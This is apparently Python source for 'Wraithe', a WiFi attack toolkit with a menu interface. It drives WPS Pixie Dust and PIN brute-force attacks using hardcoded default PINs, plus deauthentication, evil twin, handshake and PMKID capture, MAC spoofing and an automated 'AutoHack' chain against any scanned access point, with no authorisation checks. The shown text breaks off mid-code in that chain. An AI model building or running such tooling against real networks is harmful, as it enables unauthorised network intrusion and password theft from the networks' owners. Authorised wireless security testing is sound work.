#!/usr/bin/env python3
"""
Wraithe — WiFi Penetration Testing Toolkit
Modern replacement for airgeddon with focus on WPS attacks
"""

import os
import sys
import glob
import time
import json
import shutil
import subprocess
import pyfiglet
from datetime import datetime

# ── Wraithe libs ──
sys.path.insert(0, '/opt/wraithe')
from lib.interface import InterfaceManager
from lib.scanner import Scanner
from modules.wps import WPSEngine
from modules.other import OtherAttacks
from modules.evil_twin import EvilTwin
from modules.crack import Cracker

# ═══════════════════════════════════════════════════════════════════════════════
#  THEME — cyber-dark with clean visual hierarchy
# ═══════════════════════════════════════════════════════════════════════════════

C = {
    'reset':    '\033[0m',
    'bold':     '\033[1m',
    'dim':      '\033[2m',
    'italic':   '\033[3m',
    'uline':    '\033[4m',

    # Core palette
    'fg':       '\033[38;5;252m',      # default text
    'fg2':      '\033[38;5;245m',      # secondary text
    'dimfg':    '\033[38;5;240m',      # dim text
    'title':    '\033[38;5;51m',       # cyan bright — headings
    'accent':   '\033[38;5;198m',      # hot pink — highlights
    'warn':     '\033[38;5;214m',      # orange — warnings
    'ok':       '\033[38;5;83m',       # green — success
    'err':      '\033[38;5;196m',      # red — errors
    'info':     '\033[38;5;105m',      # lavender — info
    'gold':     '\033[38;5;220m',      # gold — important values

    # Signals
    'sig_strong': '\033[38;5;83m',     # green bars
    'sig_mid':    '\033[38;5;226m',    # yellow bars
    'sig_weak':   '\033[38;5;196m',    # red bars

    # Backgrounds
    'bg_ok':    '\033[48;5;28m',
    'bg_err':   '\033[48;5;124m',
    'bg_warn':  '\033[48;5;94m',
    'bg_info':  '\033[48;5;18m',
    'bg_sel':   '\033[48;5;236m',      # selection highlight
    'bg_header':'\033[48;5;17m',       # header bg

    # Box drawing
    'box_h':    '\033[38;5;239m',      # horizontal rules
    'box_v':    '\033[38;5;239m',      # vertical lines
    'box_c':    '\033[38;5;239m',      # corners
}

# ── Shortcuts for common patterns ──
def R(s): return f"{C['reset']}"
def B(s): return f"{C['bold']}{s}{C['reset']}"
def D(s): return f"{C['dim']}{s}{C['reset']}"
def T(s): return f"{C['title']}{s}{C['reset']}"
def A(s): return f"{C['accent']}{s}{C['reset']}"
def G(s): return f"{C['ok']}{s}{C['reset']}"
def Y(s): return f"{C['warn']}{s}{C['reset']}"
def Rc(s): return f"{C['err']}{s}{C['reset']}"
def I(s): return f"{C['info']}{s}{C['reset']}"
def K(s): return f"{C['gold']}{s}{C['reset']}"

# ── Signal bar generator ──
def sig_bars(signal, width=8):
    try:
        s = int(signal)
        n = max(0, min(width, (abs(s + 100) // (100 // width))))
        bars = '█' * n + '░' * (width - n)
        color = C['sig_strong'] if s >= -50 else (C['sig_mid'] if s >= -70 else C['sig_weak'])
        return f"{color}{bars} {s:>4d}{C['reset']}", n
    except:
        return f"{D('  --')}", 0

# ── Band tag ──
def band_tag(ch):
    try:
        ch_i = int(ch)
        if ch_i > 14:
            return f"{C['sig_strong']}5G{C['reset']}"
        return f"{C['dim']}2.4{C['reset']}"
    except:
        return f"{D('?')}"

# ── Encryption badge ──
def enc_badge(enc):
    if not enc:
        return D('?')
    e = enc.upper()
    if 'WPA3' in e:   return f"{C['sig_strong']}WPA3{C['reset']}"
    if 'WPA2' in e:   return f"{C['ok']}WPA2{C['reset']}"
    if 'WPA' in e:    return f"{Y('WPA')}"
    if 'WEP' in e:    return f"{Rc('WEP')}"
    if 'OPN' in e:    return f"{D('OPEN')}"
    return e[:8]

# ── WPS badge ──
def wps_badge(wps):
    if not wps:
        return D('---')
    w = wps.lower()
    if 'lock' in w or 'yes' in w or '1.0' in w or '2.0' in w:
        return f"{G('WPS')}"
    return D('---')

class Wraithe:
    def __init__(self):
        self.config = self.load_config()
        self.iface_mgr = InterfaceManager(self.config)
        self.scanner = Scanner(self.config)
        self.wps = WPSEngine(self.config, self.log)
        self.other = OtherAttacks(self.config, self.log)
        self.evil_twin = EvilTwin(self.config, self.log)
        self.cracker = Cracker({'log': self.log})
        self.targets = []
        self.interface = None
        self.monitor = None
        self.targets = []
        self.selected_target = None
        self.log_messages = []
        self._running = True
        self._interrupted = False

    def stop_all(self):
        """Stop all running processes — for clean Ctrl+C"""
        self._interrupted = True
        self.wps.stop()
        self.other.stop()
        if hasattr(self, 'cracker'):
            self.cracker.stop()

    # ── Config ──

    def load_config(self):
        config = {}
        config_path = '/opt/wraithe/config/wraithe.conf'
        if os.path.exists(config_path):
            section = None
            try:
                with open(config_path) as f:
                    for line in f:
                        line = line.strip()
                        if line.startswith('[') and line.endswith(']'):
                            section = line[1:-1]
                            config[section] = {}
                        elif '=' in line and section:
                            key, val = line.split('=', 1)
                            config[section][key.strip()] = val.strip()
            except:
                pass
        return config

    # ── Logging ──

    def log(self, msg):
        ts = datetime.now().strftime('%H:%M:%S')
        self.log_messages.append(msg)
        if len(self.log_messages) > 100:
            self.log_messages = self.log_messages[-50:]

    # ── Display ──

    def clear(self):
        os.system('clear')

    def banner(self):
        """Show the main Wraithe banner with ASCII logo"""
        try:
            fig = pyfiglet.Figlet(font='big')
            logo_lines = fig.renderText('WRAITHE').rstrip('\n').split('\n')
        except:
            logo_lines = [' WRAITHE ']

        # Find widest line and trim trailing blanks
        inner_w = 0
        while logo_lines and all(c == ' ' or c == '' for c in logo_lines[-1]):
            logo_lines.pop()
        inner_w = max(len(l) for l in logo_lines) if logo_lines else 20

        # Pad to make it even
        pad = 4
        box_w = inner_w + pad * 2
        top = f"  {C['title']}╔{'═'*box_w}╗{C['reset']}"
        bot = f"  {C['title']}╚{'═'*box_w}╝{C['reset']}"
        sep = f"  {C['title']}║{C['reset']}{' '*box_w}{C['title']}║{C['reset']}"

        lines = [top, sep]
        for l in logo_lines:
            # Color each line — gold for the logo
            left_pad = (box_w - len(l)) // 2
            right_pad = box_w - len(l) - left_pad
            colored = f"{C['gold']}{l}{C['reset']}"
            lines.append(f"  {C['title']}║{C['reset']}{' '*left_pad}{colored}{' '*right_pad}{C['title']}║{C['reset']}")

        lines.append(sep)

        # Tagline + credit
        tagline = "WIFI PWN TOOLKIT"
        credit  = "by Adam-ZS"
        tag_pad = (box_w - len(tagline)) // 2
        cred_pad = (box_w - len(credit)) // 2
        lines.append(f"  {C['title']}║{C['reset']}{' '*tag_pad}{C['dim']}{C['italic']}{tagline}{C['reset']}{' '*(box_w - tag_pad - len(tagline))}{C['title']}║{C['reset']}")
        lines.append(f"  {C['title']}║{C['reset']}{' '*cred_pad}{C['dim']}{credit}{C['reset']}{' '*(box_w - cred_pad - len(credit))}{C['title']}║{C['reset']}")
        lines.append(sep)
        lines.append(bot)

        # Subtitle
        lines.append(f"  {C['dim']}haunt the spectrum — break the keys{C['reset']}")

        print('\n'.join(lines))

    def status_bar(self):
        """Compact status bar showing interface + target"""
        # Interface
        if self.monitor:
            ch_r = self.iface_mgr.get_channel(self.monitor)
            ch = f" CH:{ch_r}" if ch_r else ''
            iface_str = f"{G(self.monitor)}{D(ch)}{R('')}"
        elif self.interface:
            iface_str = f"{Y(self.interface)}{R('')}"
        else:
            iface_str = f"{Rc('none')}"

        # Target quick status
        tgt_str = ''
        if self.selected_target:
            t = self.selected_target
            essid = t.get('essid', '?')[:22]
            bssid = t.get('bssid', '?')
            sig = t.get('signal', '')
            bars, _ = sig_bars(sig, 6)
            tgt_str = f"  {C['box_h']}│{R('')}  {A('◈')} {B(t['essid'][:20])}  {bars}  {D(bssid)}"

        print(f"  {B('IFACE')} {iface_str}{D(f'  APs:{len(self.targets)}')}{tgt_str}")
        print(f"  {D('─'*70)}")

    # ── Submenus ──

    def menu_wps(self):
        """WPS Attack Submenu — pixiewps 1.4.2, PIN DB, auto-advice"""
        while self._running:
            self.clear()
            self.banner()
            self.status_bar()

            if self.selected_target:
                t = self.selected_target
                rec = self.wps.recommend_attack(
                    bssid=t.get('bssid'),
                    signal=t.get('signal'),
                    locked=False
                )
                print(f"  {I('✦')} {D('Auto-advice:')} {rec['reason']}\n")

            print(f"  {T('═══ WPS ATTACKS ═══')}\n")
            print(f"  {G('1')}   Pixie Dust (reaver)     {D('select pixiewps mode')}  {A('★')}")
            print(f"  {G('2')}   Pixie Dust (bully)      {D('-d, often more reliable')}")
            print(f"  {G('3')}   OneShot Attack          {D('modern Python tool')}")
            print(f"  {G('4')}   PIN Brute Force         {D('known PINs + smart tries')}")
            print(f"  {G('5')}   BSSID PIN Generator     {D('derive PIN from MAC addr')}")
            print(f"  {G('6')}   WPS Scanner             {D('wash / oneshot scan')}")
            print(f"  {G('7')}   Known PINs DB           {D('load + generate variants')}")
            print(f"  {G('8')}   Lock Status Check       {D('check WPS lock state')}")
            print(f"  {G('9')}   MIM Attack              {D('Man-in-the-Middle WPS')}")
            print(f"\n  {Rc('0')}   Back to Main Menu\n")

            choice = input(f"  {C['accent']}WPS>{C['reset']} ").strip()

            if choice == '1':
                self.attack_pixie_reaver()
            elif choice == '2':
                self.attack_pixie_bully()
            elif choice == '3':
                self.attack_oneshot()
            elif choice == '4':
                self.attack_pin_brute()
            elif choice == '5':
                self.bssid_pin_generator()
            elif choice == '6':
                self.scan_wps()
            elif choice == '7':
                self.known_pins_menu()
            elif choice == '8':
                self.check_lock()
            elif choice == '9':
                self.attack_mim()
            elif choice == '0':
                return
            elif choice:
                input(f"  {Y('Unknown option.')} Press Enter...")

    # ── Targets Table ──

    def _targets_table(self):
        lines = []
        if not self.targets:
            lines.append(f"  {D('No targets yet — press S to scan')}")
            return lines

        # Header
        hdr = (f"  {B(' #')}    {B('SIGNAL')}           {B('CH')}  {B('BAND')}  "
               f"{B('ENC')}    {B('WPS')}  {B('BSSID / ESSID')}")
        lines.append(hdr)
        lines.append(f"  {D('─'*72)}")

        for i, t in enumerate(self.targets[:25]):
            bssid = t.get('bssid', '')
            essid = t.get('essid', '?')[:28]
            ch = t.get('channel', '')
            sig = t.get('signal', '')
            enc = t.get('encryption', '')
            wps = t.get('wps', '')

            sig_str, _ = sig_bars(sig)
            band_str = band_tag(ch)
            enc_str = enc_badge(enc)
            wps_str = wps_badge(wps)

            # Selection indicator
            sel = self.selected_target and bssid == self.selected_target.get('bssid')
            prefix = f"{A('▸')}" if sel else D(' ')
            row_num = f"{A(f'{i:>3d}')}" if sel else f"{D(f'{i:>3d}')}"

            line = (f"  {prefix} {row_num}  {sig_str}  "
                    f"{ch:>2s}  {band_str}  {enc_str:>8s}  {wps_str}  "
                    f"{D(bssid)}  {essid}")
            lines.append(line)

        return lines

    # ── Main Menu ──

    def menu_main(self):
        while self._running:
            self.clear()
            self.banner()
            self.status_bar()

            # ── Targets table ──
            table = self._targets_table()
            for line in table:
                print(line)

            # ── Quick help / actions ──
            print()
            if self.selected_target:
                t = self.selected_target
                print(f"  {T('═══ TARGET:')} {B(t.get('essid','?'))} {D(t.get('bssid','?'))} {T('═══')}")

                # Two-row layout with categories
                print(f"  {D('┌─ ATTACK ─────────────────────┐')}")
                print(f"  {D('│')}  {G('W')} WPS Menu   {G('P')} PixieDust  {G('B')} Bully      {D('│')}")
                print(f"  {D('│')}  {G('O')} OneShot   {G('F')} PIN Brute  {G('H')} Handshake  {D('│')}")
                print(f"  {D('│')}  {G('K')} PMKID     {G('D')} Deauth     {G('C')} CliDeauth  {D('│')}")
                print(f"  {D('│')}  {G('E')} EvilTwin    {A('X')} AutoHack    {A('Y')} SprayAll  {D('│')}")
                print(f"  {D('└─ SYSTEM ──────────────────────────┘')}")
                print(f"  {D('│')}  {I('S')} Scan  {I('I')} Interface  {I('M')} SpoofMAC  {I('L')} Log")
                print(f"  {D('│')}  {I('A')} AutoCrack  {A('Z')} HashSweep  {Rc('0')} Exit")
                print(f"  {D('└──────────────────────────────┘')}")
            else:
                # No target selected — show simplified menu
                print(f"  {D('┌─ SYSTEM ───────────────────────────┐')}")
                print(f"  {D('│')}  {I('S')} Scan    {I('I')} Interface  {I('M')} SpoofMAC  {I('L')} Log  {D('│')}")
                print(f"  {D('│')}  {I('A')} AutoCrack           {Rc('0')} Exit           {D('│')}")
                print(f"  {D('└────────────────────────────────────┘')}")

            # Quick-select hint
            if self.targets:
                print(f"\n  {D('Type e.g.')} {B('1 P')} {D('to select target 1 and run PixieDust')}")
                print(f"  {D('Or')} {B('X')} {D('AutoHack  ')} {B('Y')} {D('SprayAll  ')} {B('Z')} {D('HashSweep')}")

            # ── Prompt ──
            try:
                raw = input(f"\n  {C['accent']}❯{C['reset']} ").strip()
            except KeyboardInterrupt:
                print()
                self.quit()
                return

            if not raw:
                continue

            parts = raw.upper().split()
            choice = parts[0]

            # ── '0' alone = exit ──
            if choice == '0' and len(parts) == 1:
                self.quit()
                return

            action = parts[1] if len(parts) > 1 else None

            # ── Compound: "1 P" = select target 1, then action P ──
            if action and choice.isdigit():
                idx = int(choice)
                if 0 <= idx < len(self.targets):
                    self.selected_target = self.targets[idx]
                    t = self.selected_target
                    self.log(f'Selected: {t.get("essid", "?")} ({t.get("bssid", "?")})')
                choice = action

            elif choice.isdigit():
                idx = int(choice)
                if 0 <= idx < len(self.targets):
                    self.selected_target = self.targets[idx]
                    t = self.selected_target
                    self.log(f'Selected: {t.get("essid", "?")} ({t.get("bssid", "?")})')
                continue

            if not self.require_monitor() and choice not in ('0', 'I'):
                continue

            # ── Actions — wrapped so Ctrl+C returns to menu ──
            try:
                if choice == 'W':
                    self.menu_wps()
                elif choice == 'P':
                    self.attack_pixie_reaver()
                elif choice == 'B':
                    self.attack_pixie_bully()
                elif choice == 'O':
                    self.attack_oneshot()
                elif choice == 'F':
                    self.attack_pin_brute()
                elif choice == 'H':
                    self.capture_handshake()
                elif choice == 'K':
                    self.capture_pmkid()
                elif choice == 'D':
                    self.do_deauth()
                elif choice == 'C':
                    self.client_deauth()
                elif choice == 'E':
                    self.evil_twin_attack()
                elif choice == 'X':
                    self.auto_hack()
                elif choice == 'Y':
                    self.global_wps_spray()
                elif choice == 'Z':
                    self.global_hash_sweep()
                elif choice == 'S':
                    self.scan_networks()
                elif choice == 'I':
                    self.setup_interface()
                elif choice == 'M':
                    self.spoof_mac()
                elif choice == 'L':
                    self.view_log()
                elif choice == 'A':
                    self.auto_crack_handshake()
                elif choice == '0':
                    self.quit()
                else:
                    input(f"  {Y('Unknown.')} Press Enter...")
            except KeyboardInterrupt:
                self.stop_all()
                print(f"\n  {Y('↩ Interrupted, returning to menu...')}")
                time.sleep(1)

    # ── Interface ──

    def require_monitor(self):
        if not self.monitor:
            input(f"  {Rc('✖')} No monitor interface. Set one up first ({B('I')}).\n  Press Enter...")
            return False
        return True

    def setup_interface(self):
        self.clear()
        self.banner()
        print(f"\n  {B('Interface Setup')}\n")

        ifaces = self.iface_mgr.get_all_interfaces()
        if not ifaces:
            print(f"  {Rc('✖')} No wireless interfaces detected.")
            input("  Press Enter...")
            return

        print(f"  {D('Detected:')} {', '.join(ifaces)}\n")

        for i, iface in enumerate(ifaces):
            print(f"  {G(f'[{i+1}]')} {iface}")

        print(f"\n  {D('[0] Cancel')}")
        choice = input(f"\n  Select interface: ").strip()

        if not choice or choice == '0':
            return

        try:
            idx = int(choice) - 1
            if 0 <= idx < len(ifaces):
                self.interface = ifaces[idx]
                self.log(f'Selected interface: {self.interface}')
                print(f"\n  {Y('Starting monitor mode')} on {self.interface}...")

                mon = self.iface_mgr.start_monitor_mode(self.interface)
                if mon:
                    self.monitor = mon
                    self.log(f'Monitor mode: {mon}')
                    print(f"  {G('✔')} Monitor interface: {G(mon)}")
                else:
                    print(f"  {Rc('✖')} Failed to start monitor mode.")
                time.sleep(1)
        except ValueError:
            pass

        input("  Press Enter...")

    # ── Scanning ──

    def scan_networks(self):
        if not self.require_monitor():
            return

        self.clear()
        self.banner()
        print(f"\n  {B('Scanning Networks')}\n")
        print(f"  {G('[1]')} 2.4 GHz only {D('(ch 1-13)')}")
        print(f"  {G('[2]')} 5 GHz only  {D('(ch 36-177)')}")
        print(f"  {G('[3]')} Both bands  {D('(slower, more targets)')}")
        band_choice = input(f"\n  Band {D('[3]')}: ").strip() or '3'

        band_map = {'1': 'bg', '2': 'a', '3': 'both'}
        band = band_map.get(band_choice, 'both')
        band_name = {'bg': '2.4GHz', 'a': '5GHz', 'both': '2.4+5GHz'}.get(band, 'both')

        print(f"\n  {Y('Scanning')} {band_name} for 15s... ({D('Ctrl+C to skip wait')})")

        try:
            targets = self.scanner.scan(self.monitor, timeout=15, band=band)
        except KeyboardInterrupt:
            targets = self.scanner.targets

        self.targets = targets

        print(f"\n  {G('✔')} Found {B(len(targets))} access points:\n")
        for i, t in enumerate(self.targets):
            essid = t.get('essid', '?')[:25]
            bssid = t.get('bssid', '?')
            ch = t.get('channel', '?')
            sig = t.get('signal', '?')
            enc = t.get('encryption', '?')[:8]
            wps = t.get('wps', '')

            sig_str, _ = sig_bars(sig)
            band_str = band_tag(ch)
            enc_str = enc_badge(enc)
            wps_str = wps_badge(wps)

            print(f"  {D(f'[{i:3d}]')} {sig_str}  CH:{ch:>3s}  {band_str}  {enc_str:>8s}  {wps_str}  {D(bssid)}  {essid}")

        print(f"\n  {D('Select target with number in main menu, then action key.')}")
        input("  Press Enter...")

    def scan_wps(self):
        if not self.require_monitor():
            return

        self.clear()
        self.banner()
        print(f"\n  {B('WPS Scanner')}\n")
        print(f"  {G('1')} Wash scan {D('(fast)')}")
        print(f"  {G('2')} OneShot scan {D('(detailed)')}")
        print(f"  {D('[0] Back')}")

        choice = input(f"\n  Select: ").strip()

        if choice == '0' or not choice:
            return

        if choice == '1':
            print(f"\n  {Y('Scanning with wash... 30s')}")
            try:
                targets = self.scanner.scan_wps(self.monitor, timeout=30)
                if targets:
                    print(f"\n  {G('WPS-enabled APs:')}\n")
                    for t in targets:
                        print(f"  {t.get('bssid', '?')}  CH:{t.get('channel', '?')}  "
                              f"Sig:{t.get('signal', '?')}  Lock:{t.get('wps_lock', '?')}  "
                              f"{t.get('essid', '?')}")
                else:
                    print(f"  {Y('No targets found or wash not available.')}")
            except Exception as e:
                print(f"  {Rc('Error:')} {e}")

        elif choice == '2':
            print(f"\n  {Y('Scanning with OneShot... 45s')}")
            result = self.scanner.scan_with_oneshot(self.monitor, timeout=45)
            if result and result.get('raw'):
                print(f"\n  {G('OneShot output:')}\n")
                lines = result['raw'].split('\n')
                for line in lines[-30:]:
                    line = line.strip()
                    if line:
                        print(f"  {line[:120]}")

        input("\n  Press Enter...")

    def select_target_menu(self):
        if not self.targets:
            print(f"\n  {Y('No targets.')} Scan first ({B('S')}).")
            input("  Press Enter...")
            return

        self.clear()
        self.banner()
        print(f"\n  {B('Select Target')}\n")

        for i, t in enumerate(self.targets[:30]):
            essid = t.get('essid', '?')[:25]
            bssid = t.get('bssid', '?')
            ch = t.get('channel', '?')
            sig = t.get('signal', '?')
            sig_str, _ = sig_bars(sig)
            band_str = band_tag(ch)
            print(f"  {D(f'[{i:3d}]')} {sig_str}  CH:{ch:>3s}  {band_str}  {D(bssid)}  {essid}")

        choice = input(f"\n  Target index {D('(or 0)')}: ").strip()
        if choice and choice != '0':
            try:
                idx = int(choice)
                if 0 <= idx < len(self.targets):
                    self.selected_target = self.targets[idx]
                    t = self.selected_target
                    self.log(f'Target selected: {t.get("essid", "?")} ({t.get("bssid", "?")})')
                    print(f"\n  {G('✔')} Target set: {t.get('essid', '?')} ({t.get('bssid', '?')})")
                    time.sleep(1)
            except ValueError:
                pass

        input("  Press Enter...")

    # ── WPS Attacks ──

    def get_target_params(self):
        bssid = ''
        channel = ''
        essid = ''

        if self.selected_target:
            t = self.selected_target
            bssid = t.get('bssid', '')
            channel = t.get('channel', '')
            essid = t.get('essid', '')

        if not bssid:
            bssid = input("  BSSID (e.g. AA:BB:CC:DD:EE:FF): ").strip().upper()

        if not channel:
            channel = input("  Channel: ").strip()

        return bssid, channel, essid

    def attack_pixie_reaver(self):
        bssid, channel, essid = self.get_target_params()
        if not bssid:
            return

        self.clear()
        self.banner()
        print(f"\n  {B(T('═══ Pixie Dust Attack (reaver) ═══'))}\n")
        print(f"  {D('Target:')} {bssid}  {D('CH:')}{channel}  {D('ESSID:')}{essid}\n")
        print(f"  {B('Select pixiewps 1.4.2 mode:')}")
        print(f"  {G('1')} Standard       {D('(default brute)')}")
        print(f"  {G('2')} Low effort     {D('(fast, low compute)')}")
        print(f"  {G('3')} Balanced might {D('(medium compute)')}")
        print(f"  {G('4')} Force          {D('(aggressive brute)')}")
        print(f"  {G('5')} Full brute     {D('(slow, thorough)')}")
        print(f"  {G('6')} All modes      {D('(run all sequentially)')}")
        m = input(f"\n  Mode {D('[1]')}: ").strip() or '1'

        mode_map = {'1':'1','2':'2','3':'3','4':'4','5':'5','6':'6'}
        pixie_mode = mode_map.get(m, '1')

        spoof = input(f"  Spoof MAC? {D('[y/N]')}: ").strip().lower() == 'y'

        mode_names = {'1':'standard','2':'low','3':'might','4':'force','5':'full','6':'all'}
        print(f"\n  {Y('Mode:')} {mode_names.get(pixie_mode, pixie_mode)} — {D('Ctrl+C to stop')}\n")

        if pixie_mode == '6':
            for mode_num in ['1','2','3','4','5']:
                if not self.wps._running:
                    print(f"\n  {C['info']}Mode {mode_names[mode_num]}...{C['reset']}")
                result = self.wps.pixie_dust_reaver(
                    self.monitor, bssid, essid, channel,
                    timeout=int(self.config.get('wps', {}).get('reaver_timeout', 120)),
                    pixie_mode=mode_num,
                    spoof_mac=spoof
                )
                if result.get('success'):
                    self.show_attack_result(result)
                    return
            self.show_attack_result(result)
        else:
            result = self.wps.pixie_dust_reaver(
                self.monitor, bssid, essid, channel,
                timeout=int(self.config.get('wps', {}).get('reaver_timeout', 120)),
                pixie_mode=pixie_mode,
                spoof_mac=spoof
            )
            self.show_attack_result(result)

    def attack_pixie_bully(self):
        bssid, channel, essid = self.get_target_params()
        if not bssid:
            return

        self.clear()
        self.banner()
        print(f"\n  {B(T('═══ Pixie Dust Attack (bully) ═══'))}\n")
        print(f"  {D('Target:')} {bssid}  {D('CH:')}{channel}  {D('ESSID:')}{essid}")
        print(f"  {Y('Press Ctrl+C to stop')}\n")

        result = self.wps.pixie_dust_bully(
            self.monitor, bssid, essid, channel,
            timeout=int(self.config.get('wps', {}).get('bully_timeout', 120))
        )

        self.show_attack_result(result)

    def attack_oneshot(self):
        bssid, channel, essid = self.get_target_params()

        self.clear()
        self.banner()
        print(f"\n  {B(T('═══ OneShot Attack ═══'))}\n")
        print(f"  {D('Target:')} {bssid or 'all targets'}  {D('CH:')}{channel}")
        print(f"  {Y('OneShot combines Pixie Dust + PIN brute')}")
        print(f"  {Y('Press Ctrl+C to stop')}\n")

        result = self.wps.oneshot_attack(
            self.monitor, bssid, channel,
            timeout=int(self.config.get('wps', {}).get('oneshot_timeout', 180))
        )

        self.show_attack_result(result)

    def attack_pin_brute(self):
        bssid, channel, essid = self.get_target_params()
        if not bssid:
            return

        self.clear()
        self.banner()
        print(f"\n  {B(T('═══ PIN Brute Force ═══'))}\n")
        print(f"  {D('Target:')} {bssid}  {D('CH:')}{channel}  {D('ESSID:')}{essid}\n")

        print(f"  {B('PIN sources:')}")
        print(f"  {G('1')} Load known PINs database")
        print(f"  {G('2')} Manual PIN entry")
        print(f"  {G('3')} Auto-generate from known patterns")

        c = input(f"\n  Select: ").strip()

        pins = []
        if c == '1':
            pins = self.wps.load_known_pins('/opt/wraithe/data/known_pins.db')
            if not pins:
                airgeddon_db = '/usr/share/airgeddon/known_pins.db'
                if os.path.exists(airgeddon_db):
                    shutil.copy(airgeddon_db, '/opt/wraithe/data/known_pins.db')
                    pins = self.wps.load_known_pins()
            print(f"  Loaded {len(pins)} known PINs")
        elif c == '2':
            pin_input = input("  Enter PINs (comma separated): ").strip()
            pins = [p.strip() for p in pin_input.split(',') if p.strip()]
        elif c == '3':
            base = input("  Base PIN (from same manufacturer): ").strip()
            if base:
                pins = self.wps.generate_pin_variants(base)
            else:
                pins = ['12345670', '12345671', '16927032', '18896732',
                       '47331017', '27307945', '86290241', '32028443']

        if not pins:
            print(f"  {Rc('No PINs to test.')}")
            input("  Press Enter...")
            return

        print(f"\n  {Y('Testing')} {len(pins)} PINs... {D('Ctrl+C to stop')}\n")

        result = self.wps.pin_brute(
            self.monitor, bssid, pins[:50], essid, channel,
            timeout=int(self.config.get('wps', {}).get('pin_brute_timeout', 600)),
            lock_wait=int(self.config.get('wps', {}).get('lock_wait', 60))
        )

        if result:
            self.show_attack_result(result)

    def known_pins_menu(self):
        self.clear()
        self.banner()
        print(f"\n  {B('Known PINs Database')}\n")

        pins = self.wps.load_known_pins()
        if not pins:
            airgeddon_db = '/usr/share/airgeddon/known_pins.db'
            if os.path.exists(airgeddon_db):
                print(f"  {Y('Copying from airgeddon...')}")
                shutil.copy(airgeddon_db, '/opt/wraithe/data/known_pins.db')
                pins = self.wps.load_known_pins()

        if pins:
            print(f"  Total PINs: {B(len(pins))}\n")
            print(f"  Sample: {', '.join(pins[:15])}")
            if len(pins) > 15:
                print(f"  {D(f'... and {len(pins)-15} more')}")
            print(f"\n  {D('Note: Known PINs are tested first in brute force')}")
        else:
            print(f"  {Y('No known PINs database found.')}")
            print(f"  {D('Download from: https://github.com/airgeddon/known_pins.db')}")

        input("\n  Press Enter...")

    def bssid_pin_generator(self):
        bssid, channel, essid = self.get_target_params()
        if not bssid:
            return

        self.clear()
        self.banner()
        print(f"\n  {B('BSSID PIN Generator')}\n")
        print(f"  {D('BSSID:')} {bssid}")

        pins = self.wps.generate_pins_from_bssid(bssid)

        if pins:
            print(f"\n  {G('Generated')} {len(pins)} PINs from BSSID:\n")
            for i, pin in enumerate(pins[:20], 1):
                print(f"  {i:3d}. {K(pin)}")
            if len(pins) > 20:
                print(f"  {D(f'... and {len(pins)-20} more')}")

            print(f"\n  {B('Options:')}")
            print(f"  {G('1')} Test these PINs now")
            print(f"  {G('2')} Save to file")
            print(f"  {D('[0] Return')}")
            choice = input(f"\n  Select: ").strip()

            if choice == '1':
                result = self.wps.pin_brute(
                    self.monitor, bssid, pins, essid, channel,
                    timeout=600, lock_wait=60
                )
                if result:
                    self.show_attack_result(result)
            elif choice == '2':
                out = f'/tmp/wraithe_pins_{bssid.replace(":", "")}.txt'
                with open(out, 'w') as f:
                    for p in pins:
                        f.write(f'{p}\n')
                print(f"  {G('✔')} Saved to {out}")
                input("  Press Enter...")
        else:
            print(f"\n  {Y('Could not generate PINs from this BSSID.')}")
            input("  Press Enter...")

    def attack_mim(self):
        bssid, channel, essid = self.get_target_params()
        if not bssid:
            return

        self.clear()
        self.banner()
        print(f"\n  {B(T('═══ WPS MIM Attack ═══'))}\n")
        print(f"  {D('Target:')} {bssid}  {D('CH:')}{channel}  {D('ESSID:')}{essid}")
        print(f"  {Y('MIM tricks AP into revealing PIN via man-in-the-middle')}")
        print(f"  {Y('Press Ctrl+C to stop')}\n")

        result = self.wps.mim_attack(
            self.monitor, bssid, essid, channel,
            timeout=int(self.config.get('wps', {}).get('mim_timeout', 300))
        )
        self.show_attack_result(result)

    def check_lock(self):
        bssid, channel, essid = self.get_target_params()
        if not bssid:
            return

        print(f"\n  {Y('Checking WPS lock status')} for {bssid}...")
        status = self.wps.check_lock_status(self.monitor, bssid)
        locked = status.get('locked')

        if locked is True:
            print(f"\n  {Rc('◈')} WPS is {B('LOCKED')} on this AP")
            print(f"  {D('Lockout usually lasts 30-300 seconds')}")
        elif locked is False:
            print(f"\n  {G('◈')} WPS is {B('AVAILABLE')}")
            print(f"  {D('Ready to attack!')}")
        else:
            print(f"\n  {Y('◈')} Could not determine lock status")
            print(f"  {D('Try running a WPS scan first')}")

        input("\n  Press Enter...")

    def auto_hack(self):
        """Auto-detect best attack vector, execute it, get the password
        Aggressive chain: Pixie (modes 1,2,4) → Bully → OneShot → PIN → PMKID → Handshake
        """
        if not self.require_monitor():
            return
        if not self.selected_target:
            print(f"\n  {Y('No target selected.')} Select one first.")
            input("  Press Enter...")
            return

        t = self.selected_target
        bssid = t.get('bssid', '')
        channel = t.get('channel', '')
        essid = t.get('essid', '')
        signal = t.get('signal', '')

        if not bssid:
            print(f"\n  {Y('No BSSID for target.')}")
            input("  Press Enter...")
            return

        self.clear()
        self.banner()
        print(f"\n  {B(T('═══ AUTO HACK ═══'))}\n")
        print(f"  {D('Target:')}  {B(essid[:30])}")
        print(f"  {D('BSSID:')}  {bssid}")
        print(f"  {D('CH:')}    {channel}  {D('Signal:')} {signal}")
        print(f"  {D('─'*60)}\n")
        print(f"  {Y('Press Ctrl+C anytime to abort attack and return to menu')}\n")

        # ═══ Phase 1: Recon ═══
        print(f"  {I('◈')} {B('Phase 1: Reconnaissance')}\n")

        print(f"  {Y('Checking WPS status...')} ", end='', flush=True)
        wps_info = self.wps.check_lock_status(self.monitor, bssid)
        locked = wps_info.get('locked')
        if locked is True:
            print(f"{Rc('LOCKED')}")
            wps_good = False
        elif locked is False:
            print(f"{G('AVAILABLE')}")
            wps_good = True
        else:
            print(f"{Y('unknown (will try Pixie anyway)')}")
            wps_good = True

        print()

        # ═══ Attack chain config ═══
        chain = []
        if wps_good:
            # Tier 1 — Pixie Dust (multiple modes + bully)
            chain = [
                (1, f"Pixie Dust  reaver mode 1  (standard, {G('most reliable')})",
                 lambda: self.wps.pixie_dust_reaver(
                     self.monitor, bssid, essid, channel,
                     timeout=60, pixie_mode='1', spoof_mac=True)),
                (2, f"Pixie Dust  reaver mode 2  (low-effort, {Y('fast')})",
                 lambda: self.wps.pixie_dust_reaver(
                     self.monitor, bssid, essid, channel,
                     timeout=60, pixie_mode='2', spoof_mac=True)),
                (3, f"Pixie Dust  reaver mode 4  (force, {Y('aggressive')})",
                 lambda: self.wps.pixie_dust_reaver(
                     self.monitor, bssid, essid, channel,
                     timeout=60, pixie_mode='4', spoof_mac=True)),
                (4, f"Pixie Dust  bully          ({G('different engine')})",
                 lambda: self.wps.pixie_dust_bully(
